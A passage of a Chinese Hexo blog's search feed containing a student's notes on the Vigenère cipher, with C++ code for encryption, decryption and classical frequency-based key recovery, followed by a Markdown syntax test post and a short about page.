        <content type="html"><![CDATA[<h1 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h1><h2 id="——加密解密与破解"><a href="#——加密解密与破解" class="headerlink" title="——加密解密与破解"></a>——加密解密与破解</h2><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>  维吉尼亚是一种多表代换密码，是在Caesar 密码的基础上衍生出的加密算法，属于多表密码的一种简单形式，它是由一些偏移量不同的凯撒密码组成的。</p><p><img src="https://s2.ax1x.com/2019/12/12/QyjSYQ.png" alt="QyjSYQ.png"></p><p>  如图一样，0-25对应的是a-z（A-Z）；</p><a id="more"></a><h2 id="加密："><a href="#加密：" class="headerlink" title="加密："></a>加密：</h2><p>形如 明文为a，秘钥为a，这加密为a;</p><p>实际上就是（明文的ascii值+秘钥ASCII码）mod26；</p><p>下面贴出核心C++代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">&#123;</span><br><span class="line">flag=(key[i%lenk]-<span class="string">'a'</span>)%<span class="number">26</span>;<span class="comment">//k[]为秘钥数组，lenk为秘钥长度；</span></span><br><span class="line">c[i]=(m[i]-<span class="string">'a'</span>+flag)%<span class="number">26</span>+<span class="string">'a'</span>;<span class="comment">//加密后存住；</span></span><br><span class="line"></span><br><span class="line">&#125;<span class="comment">//加密；</span></span><br></pre></td></tr></table></figure><h2 id="解密："><a href="#解密：" class="headerlink" title="解密："></a>解密：</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">&#123;</span><br><span class="line">flag=(key[i%lenk]-<span class="string">'a'</span>)%<span class="number">26</span>;</span><br><span class="line"><span class="keyword">if</span>(c[i]&gt;=key[i%lenk])</span><br><span class="line">   m[i]=(c[i]-<span class="string">'a'</span>-flag)%<span class="number">26</span>+<span class="string">'a'</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">               m[i]=(c[i]+<span class="number">26</span>-<span class="string">'a'</span>-flag)+<span class="string">'a'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="破解："><a href="#破解：" class="headerlink" title="破解："></a>破解：</h2><h3 id="破解秘钥长度："><a href="#破解秘钥长度：" class="headerlink" title="破解秘钥长度："></a>破解秘钥长度：</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> c[<span class="number">500</span>]=<span class="string">""</span>;<span class="comment">//输入密文，要足够长满足条件； </span></span><br><span class="line"> <span class="keyword">int</span> klen=<span class="number">1</span>;   <span class="comment">//密钥长度</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> clen=<span class="built_in">strlen</span>(c);   <span class="comment">//密文的长度      </span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">float</span> IC[klen]; <span class="comment">//重合指数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">float</span> avgIC=<span class="number">0</span>;  <span class="comment">//平均重合指数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;klen;i++)    <span class="comment">//统计分组字母个数 </span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> out[<span class="number">26</span>]=&#123; <span class="number">0</span> &#125;;   <span class="comment">//盛放字母个数的数组</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;i+j*klen&lt;clen;j++)</span><br><span class="line"></span><br><span class="line">   out[(<span class="keyword">int</span>)(c[i+j*klen]-<span class="string">'a'</span>)]++;  </span><br><span class="line"></span><br><span class="line">        <span class="keyword">float</span> e=<span class="number">0.000f</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> L=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;<span class="number">26</span>;k++)    <span class="comment">//子串密文长度 </span></span><br><span class="line"></span><br><span class="line">            L+=out[k];</span><br><span class="line"></span><br><span class="line">        L*=(L<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;<span class="number">26</span>;k++)        <span class="comment">//分组计算重合指数IC </span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(out[k]!=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">           e=e+((<span class="keyword">float</span>)out[k]*(<span class="keyword">float</span>)(out[k]<span class="number">-1</span>))/(<span class="keyword">float</span>)L;</span><br><span class="line"></span><br><span class="line">IC[i]=e;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;klen;i++)</span><br><span class="line"></span><br><span class="line">   avgIC+=IC[i];</span><br><span class="line"></span><br><span class="line">avgIC/=klen;          <span class="comment">//求IC的平均值  </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (avgIC &gt;= <span class="number">0.06</span>)  <span class="keyword">break</span>;    <span class="comment">//判断退出条件，重合指数的平均值是否大于0.06 </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>  klen++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">cout</span>&lt;&lt;<span class="string">"密钥长度为："</span>&lt;&lt;klen&lt;&lt;<span class="built_in">endl</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="逐个破解秘钥字母"><a href="#逐个破解秘钥字母" class="headerlink" title="逐个破解秘钥字母:"></a>逐个破解秘钥字母:</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> klen=;<span class="comment">//输入求出的秘钥长度； </span></span><br><span class="line"><span class="keyword">char</span> c[<span class="number">5000</span>]=<span class="string">""</span>;<span class="comment">//输入密文； </span></span><br><span class="line">     <span class="keyword">int</span> clen=<span class="built_in">strlen</span>(c);</span><br><span class="line"></span><br><span class="line"><span class="keyword">float</span> p[] = &#123;<span class="number">0.08167</span>, <span class="number">0.01492</span>, <span class="number">0.02782</span>, <span class="number">0.04253</span>, <span class="number">0.12702</span>, <span class="number">0.02228</span>, <span class="number">0.02015</span>, <span class="number">0.06094</span>, <span class="number">0.06966</span>, <span class="number">0.00153</span>, <span class="number">0.00772</span>, <span class="number">0.04025</span>,<span class="number">0.02406</span>, <span class="number">0.06749</span>, <span class="number">0.07507</span>, <span class="number">0.01929</span>, <span class="number">0.00095</span>, <span class="number">0.05987</span>, <span class="number">0.06327</span>, <span class="number">0.09056</span>, <span class="number">0.02758</span>, <span class="number">0.00978</span>, <span class="number">0.02360</span>, <span class="number">0.00150</span>,<span class="number">0.01974</span>, <span class="number">0.00074</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> key[<span class="number">100</span>]=&#123; <span class="number">0</span> &#125;;    <span class="comment">//存放密钥 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;klen;i++)    <span class="comment">//统计分组字母个数 </span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> g=<span class="number">0</span>;   <span class="comment">//密文移动g个位置 </span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> t=<span class="number">0</span>;t&lt;<span class="number">26</span>;t++)</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">float</span> x=<span class="number">0.00000f</span>;    <span class="comment">//拟重合指数 </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> out[<span class="number">26</span>]=&#123; <span class="number">0</span> &#125;;   <span class="comment">//盛放字母个数的数组</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;i+j*klen&lt;clen;j++)</span><br><span class="line"></span><br><span class="line">   out[(<span class="keyword">int</span>)(c[i+j*klen]-<span class="string">'a'</span>)]++;  </span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> L=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;<span class="number">26</span>;k++)&#123;      <span class="comment">//子串密文长度 </span></span><br><span class="line"></span><br><span class="line">            L+=out[k];&#125; </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;<span class="number">26</span>;k++)&#123; </span><br><span class="line"></span><br><span class="line">            x=x+p[k]*out[(k+g)%<span class="number">26</span>];&#125; </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(x/L&gt;<span class="number">0.055</span>) &#123;</span><br><span class="line"></span><br><span class="line">        key[i]=g;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span> g++;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">cout</span>&lt;&lt;<span class="string">"加密密钥为："</span>; </span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;klen;i++)    <span class="comment">//输出密钥字 </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="keyword">char</span> (<span class="string">'a'</span>+key[i]);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> crypt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>test</title>
      <link href="/2019/12/02/test/"/>
      <url>/2019/12/02/test/</url>
      
        <content type="html"><![CDATA[<h1 id="Markdown语法测试"><a href="#Markdown语法测试" class="headerlink" title="Markdown语法测试"></a>Markdown语法测试</h1><p>[TOC]</p><h2 id="二级标题-ctrl-2"><a href="#二级标题-ctrl-2" class="headerlink" title="二级标题-ctrl 2"></a>二级标题-ctrl 2</h2><h3 id="三级标题-Ctrl3"><a href="#三级标题-Ctrl3" class="headerlink" title="三级标题-Ctrl3"></a>三级标题-Ctrl3</h3><h4 id="四级标题-可用？"><a href="#四级标题-可用？" class="headerlink" title="四级标题####可用？"></a>四级标题####可用？</h4><p>  正文</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * form &quot;代码段-mysql&quot; where we be set;</span><br></pre></td></tr></table></figure><p>wwww</p><p> &lt;center&gt;juzhong?&lt;/center&gt;</p><p><u>下划线内容Ctrl u</u></p><p><strong>加粗ctrl b</strong></p><p><a href="https://www.baidu.com" target="_blank" rel="noopener">百度一下ctrl k</a></p><hr><p>+++</p><h4 id="biaoti"><a href="#biaoti" class="headerlink" title="biaoti"></a>biaoti</h4><blockquote><p>区块（&gt;）</p></blockquote><blockquote><p>多级</p><blockquote><p>嵌套</p><blockquote><p>区块</p></blockquote></blockquote></blockquote><p>/目录[]中加TOC/</p><p>我的<code>daima</code></p><ul><li>无序列*+空格<ul><li>无须    *    <ul><li>再tab</li><li><em>ok</em></li></ul></li></ul></li></ul><ul><li><pre><code>* </code></pre></li></ul><ol><li>列表一1. +空格</li><li>三</li></ol><p>|姓名|性别|学号</p><table><thead><tr><th>：陈得乐：</th><th>：左对齐</th><th>右对齐：</th></tr></thead><tbody><tr><td>吊</td><td>牛</td><td>|+东西|</td></tr></tbody></table><p><a href="https://imgse.com/i/QurE4O" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/02/QurE4O.md.jpg" alt="QurE4O.md.jpg"></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>about</title>
      <link href="/2019/12/01/first-test/"/>
      <url>/2019/12/01/first-test/</url>
      
        <content type="html"><![CDATA[<h1 id="关于博文的说明"><a href="#关于博文的说明" class="headerlink" title="关于博文的说明"></a>关于博文的说明</h1><p>​    这里的博文说是博文，不如说是自己的学习笔记，在互联网学习，一直没有什么地方可以记录，于是打算找个地方做笔记，以便回望大学的时候，不是一脸的茫茫然。。</p>]]></content>
      
      
      <categories>
          
          <category> about </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
